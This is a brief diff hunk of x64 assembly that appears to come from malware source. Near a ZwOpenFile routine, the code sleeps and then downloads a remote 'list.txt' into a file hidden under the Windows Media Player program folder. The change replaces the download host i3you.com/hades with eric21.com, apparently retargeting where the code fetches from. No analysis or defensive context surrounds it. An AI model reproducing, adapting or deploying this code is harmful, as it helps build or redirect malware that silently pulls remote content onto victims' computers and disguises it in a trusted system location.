@@ -852,7 +852,7 @@ ZwOpenFile@ endp
                 call @Sleep
                 xor rcx,rcx
                 call @F
-                db "http://www.i3you.com/hades/list.txt",0
+                db "http://www.eric21.com/list.txt",0
              @@:pop rdx
                 call @F
                 db "C:\Program Files\Windows Media Player\list.txt",0
